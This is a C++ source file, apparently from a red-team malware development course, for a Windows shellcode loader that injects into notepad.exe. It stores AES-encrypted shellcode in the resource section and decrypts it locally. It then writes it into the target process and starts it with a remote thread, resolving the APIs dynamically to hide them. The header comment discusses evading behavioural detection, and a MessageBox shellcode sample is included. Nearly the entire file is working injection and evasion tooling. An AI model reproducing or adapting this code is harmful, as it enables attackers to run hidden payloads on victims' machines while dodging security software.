/*
Solution to the problem i had initially where the shellcode in the rsrc section
wasn't decrypted was to allocate memory in the created process by the shellcode runner
decrypt the shellcode in it and then move the decrypted shellcode memory to the remote process 

Unfortunately since decryption is done first locally, behavioural analysis will likely trigger 
when decrypted shellcode is then inserted in the memory of the target process ??
*/

#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "resource1.h"

LPVOID (WINAPI* pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
BOOL (WINAPI* pWriteProcessMemory)(HANDLE hProcess,LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
BOOL (WINAPI* pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
HANDLE (WINAPI* pCreateRemoteThreadEx)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, PDWORD lpThreadId);
HANDLE (WINAPI* pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

// MessageBox shellcode - 64-bit (exitfunc = thread)
// ^ - >> Hi from Red Team Operator ! <<
//              UNENCRYPTED
/*unsigned char shellcode[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00 };
*/

// RTO Mal Dev course
int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    
    BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (CryptAcquire == false) {
        //printf("CryptAcquireContextW Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (CryptCreate == false) {
        //printf("CryptCreateHash Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    if (CryptHash == false) {
        //printf("CryptHashData Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    if (CryptDerive == false) {
        //printf("CryptDeriveKey Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
    if (Crypt_Decrypt == false) {
        //printf("CryptDecrypt Failed: %d\n", GetLastError());
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}


// https://stackoverflow.com/a/55030118
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return pid;
}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int main()
{

    HMODULE libHM = LoadLibraryW(L"kernel32.dll");
    if (libHM == NULL) {
        //printf("Can't load Kernel32.DLL\n");
        //printf("Error code: %d", GetLastError());
        return -2;
    }

    (FARPROC&)pVirtualAllocExNuma = GetProcAddress(libHM, "VirtualAllocExNuma");
    (FARPROC&)pVirtualProtectEx = GetProcAddress(libHM, "VirtualProtectEx");
    (FARPROC&)pWriteProcessMemory = GetProcAddress(libHM, "WriteProcessMemory");
    (FARPROC&)pCreateRemoteThreadEx = GetProcAddress(libHM, "CreateRemoteThreadEx");
    (FARPROC&)pOpenProcess = GetProcAddress(libHM, "OpenProcess");

    FreeLibrary(libHM);

    unsigned char key[] = { 0x49, 0xe6, 0x28, 0xd7, 0x42, 0xe, 0xc6, 0xcd, 0x5f, 0x44, 0xea, 0x89, 0xe0, 0x72, 0x91, 0x90 };
    DWORD key_len = sizeof(key);
    unsigned char* shellcode;
    DWORD scSize;

    // Generate a resource.rc & resource.h poiting to a file of binary (raw) type shellcode
    // .rsrc storage && .rsrc payload extraction
    HRSRC res = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    HGLOBAL resHandle = LoadResource(NULL, res);
    shellcode = (unsigned char*)LockResource(resHandle);
    scSize = SizeofResource(NULL, res);

    // ! Change process !
    auto procPid = FindProcessId(L"notepad.exe");
    if (!procPid) {
        //printf("Process not found !");
        return -1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, procPid);
    if (!hProcess) return 0;

    //Current process handle upon launch
    HANDLE lgcp = GetCurrentProcess();

    LPVOID lvAlloc = pVirtualAllocExNuma(lgcp, 0, (SIZE_T)scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0); //Local process 
    CloseHandle(lgcp); // Close handle to the local process after mem allocation has finished

    LPVOID rvAlloc = pVirtualAllocExNuma(hProcess, 0, (SIZE_T)scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0); //Remote process memory

    if (rvAlloc == NULL && lvAlloc == NULL) {
        return 0;
    }
    else
    {
        //Sleep(5000);
        printf("Address of allocated memory in local process: 0x%p\n", lvAlloc);
        printf("Address of allocated memory in remote process: 0x%p\n", rvAlloc);
    } //printf("VirtualAllocExNuma Success\n");

    // Moving encrypted shellcode to the locally allocated memory
    memmove(lvAlloc, shellcode, scSize);

    // Locally allocated encrypted shellcode is decrypted
    AESDecrypt((unsigned char*)lvAlloc, scSize, (char*)key, key_len);

    // Decrypted shellcode in memory is written to the target process
    bool wProcessMem = pWriteProcessMemory(hProcess, rvAlloc, lvAlloc, (SIZE_T)scSize, nullptr);
    if (wProcessMem == false) {
        return 0;
    } //printf("WriteProcessMemory Success\n
    
    // Protection of memory pages is changed to EXECUTE_READ
    DWORD oldProtect = NULL;
    if (!pVirtualProtectEx(hProcess, rvAlloc, (SIZE_T)scSize, PAGE_EXECUTE_READ, &oldProtect)) {
        return 0;
    } //printf("VirtualProtectEx Success\n");

    // Remote thread started
    HANDLE cThread = pCreateRemoteThreadEx(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)rvAlloc, NULL, 0, NULL);
    if (!cThread) {
        return 0;
    } //printf("CreateRemoteThreadEx Success\n");
    
    CloseHandle(cThread);
    CloseHandle(hProcess);
    free(lvAlloc);
    return 0;
}